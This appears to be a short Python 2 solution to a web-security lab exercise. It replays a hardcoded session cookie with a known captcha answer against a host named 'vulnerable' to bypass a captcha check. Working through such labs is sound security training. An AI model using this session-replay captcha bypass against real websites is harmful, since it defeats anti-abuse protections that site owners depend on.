import httplib, re

if __name__ == '__main__':
    conn = httplib.HTTPConnection('vulnerable')
    headers = {'Cookie': 'rack.session=557800bb7e8e463768fca2ce85de421f1844fd0f5e1a9e9d14770c931968d953'}
    conn.request('GET', '/captcha/example4/submit?captcha=hanna&submit=Submit', '', headers)
    res = conn.getresponse()
    if re.search(r'Success!!!', res.read()):
        print 'Success!!!'
